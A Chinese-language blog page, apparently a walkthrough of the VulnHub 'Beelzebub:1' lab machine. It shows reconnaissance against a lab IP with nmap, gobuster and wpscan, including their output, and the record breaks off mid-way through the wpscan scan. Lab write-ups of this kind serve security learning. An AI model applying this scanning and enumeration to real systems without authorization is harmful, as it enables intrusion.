@@ -1,0 +1,537 @@
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_a0oqhord1y';window.REIMU_CONFIG.clipboard_tips = {"success":{"zh-CN":"复制成功 (*^▽^*)"},"fail":{"zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = '本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  <title>
+    VulnHub Beelzebub：1 | 雾島风起時
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_a0oqhord1y.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="Beelzebub：1博客地址：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jason-huawen&#x2F;p&#x2F;16941009.html（该靶机网络连接很不稳定，懒得打了） 项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;beelzebub&#x2F;Beelzebub.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulnHub Beelzebub：1">
+<meta property="og:url" content="http://example.com/2026/06/10/Beelzebub%201/index.html">
+<meta property="og:site_name" content="雾島风起時">
+<meta property="og:description" content="Beelzebub：1博客地址：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jason-huawen&#x2F;p&#x2F;16941009.html（该靶机网络连接很不稳定，懒得打了） 项目地址：https:&#x2F;&#x2F;download.vulnhub.com&#x2F;beelzebub&#x2F;Beelzebub.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic1.imgdb.cn/item/6a2a27e0336be9166379b875.png">
+<meta property="article:published_time" content="2026-06-10T10:40:00.000Z">
+<meta property="article:modified_time" content="2026-06-11T03:37:38.534Z">
+<meta property="article:author" content="ALL">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic1.imgdb.cn/item/6a2a27e0336be9166379b875.png">
+    <link rel="alternate" href="/atom.xml" title="雾島风起時" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">首页</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/archives">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">归档</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/about">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">关于</span>
+        </a>
+        <a class="main-nav-link-wrap" href="/friend">
+            <div class="main-nav-icon icon rotate">
+                &#xe62b;
+            </div>
+          <span class="main-nav-link">友链</span>
+        </a>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" aria-label="RSS 订阅" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="VulnHub Beelzebub：1">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">VulnHub Beelzebub：1</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Beelzebub%EF%BC%9A1"><span class="toc-number">1.</span> <span class="toc-text">Beelzebub：1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SolarWinds-Serv-U%EF%BC%88CVE-2019-12181%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">SolarWinds Serv-U（CVE-2019-12181）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">134</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">166</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-Beelzebub 1" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-06-10T10:40:00.000Z" itemprop="datePublished">2026-06-10</time>
+    <time style="display: none;" id="post-update-time">2026-06-11</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="Beelzebub：1"><a href="#Beelzebub：1" class="headerlink" title="Beelzebub：1"></a>Beelzebub：1</h1><p>博客地址：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/jason-huawen/p/16941009.html%EF%BC%88%E8%AF%A5%E9%9D%B6%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E5%BE%88%E4%B8%8D%E7%A8%B3%E5%AE%9A%EF%BC%8C%E6%87%92%E5%BE%97%E6%89%93%E4%BA%86%EF%BC%89">https://www.cnblogs.com/jason-huawen/p/16941009.html（该靶机网络连接很不稳定，懒得打了）</a></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://download.vulnhub.com/beelzebub/Beelzebub.zip">https://download.vulnhub.com/beelzebub/Beelzebub.zip</a></p>
+<p>是一个打包好的镜像文件</p>
+<p><strong>注意：导入 ova 时一定要选择我已移动，否则没网</strong></p>
+<p>使用 Nmap 扫描出开放服务及操作系统版本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sS -sV -sC -p- 192.168.56.244 -oN nmap_full_scan</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-30 20:58 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (192.168.56.244)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 20:d1:ed:84:cc:68:a5:a7:86:f0:da:b8:92:3f:d9:67 (RSA)</span><br><span class="line">|   256 78:89:b3:a2:75:12:76:92:2a:f9:8d:27:c1:08:a7:b9 (ECDSA)</span><br><span class="line">|_  256 b8:f4:d6:61:cf:16:90:c5:07:18:99:b0:7c:70:fd:c0 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">MAC Address: 08:00:27:9F:89:8A (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.12 seconds</span><br></pre></td></tr></table></figure>
+
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>访问首页</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--My heart was encrypted, &quot;beelzebub&quot; somehow hacked and decoded it.-md5--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.30 (Ubuntu)<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>作者提示 MD5，因此需要将 <code>beelzebub</code> 进行 MD5 加密</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]</span><br><span class="line">└─$ <span class="built_in">echo</span> -n <span class="string">&#x27;beelzebub&#x27;</span> | <span class="built_in">md5sum</span></span><br><span class="line">d18e1e22becbd915b45e0e655429d487  -</span><br></pre></td></tr></table></figure>
+
+<p>根据提示扫描该目录，此时扫描出 wordpress 目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]</span><br><span class="line">└─$ gobuster <span class="built_in">dir</span> -u http://192.168.56.244/d18e1e22becbd915b45e0e655429d487 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.3</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.56.244/d18e1e22becbd915b45e0e655429d487</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.3</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/11/30 22:04:30 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/wp-content           (Status: 301) [Size: 354] [--&gt; http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-content/]</span><br><span class="line">/wp-includes          (Status: 301) [Size: 355] [--&gt; http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-includes/]</span><br><span class="line">/wp-admin             (Status: 301) [Size: 352] [--&gt; http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-admin/]</span><br><span class="line">Progress: 218664 / 220561 (99.14%)===============================================================</span><br><span class="line">2022/11/30 22:04:44 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>
+
+<p>接下来看可否用 wpscan 扫描出用户名或者插件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]</span><br><span class="line">└─$ wpscan  --url http://192.168.56.244/d18e1e22becbd915b45e0e655429d487 -e --plugins-detection aggressive --ignore-main-redirect --force</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] It seems like you have not updated the database for some time.</span></span><br><span class="line"><span class="string">[?] Do you want to update now? [Y]es [N]o, default: [N]</span></span><br><span class="line"><span class="string">[+] URL: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/ [192.168.56.244]</span></span><br><span class="line"><span class="string">[+] Started: Wed Nov 30 22:21:55 2022</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - X-Redirect-By: WordPress</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).</span></span><br><span class="line"><span class="string"> | Found By: Atom Generator (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  -  http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/ , &lt;generator uri=&quot;https://wordpress.org/&quot; version=&quot;5.3.6&quot;&gt;WordPress&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> | Confirmed By: Style Etag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  -  http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php , Match: &#x27;</span>5.3.6<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Plugins (via Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:34 &lt;===========================================&gt; (4989 / 4989) 100.00% Time: 00:00:34</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No plugins Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:00 &lt;=============================================&gt; (479 / 479) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No themes Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Timthumbs (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Known Locations - Time: 00:00:01 &lt;===========================================&gt; (2568 / 2568) 100.00% Time: 00:00:01</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Timthumbs Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Config Backups (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking Config Backups - Time: 00:00:00 &lt;==============================================&gt; (137 / 137) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No Config Backups Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating DB Exports (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Checking DB Exports - Time: 00:00:00 &lt;====================================================&gt; (71 / 71) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] No DB Exports Found.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to &quot;Plain&quot; for those to be detected)</span></span><br><span class="line"><span class="string"> Brute Forcing Attachment IDs - Time: 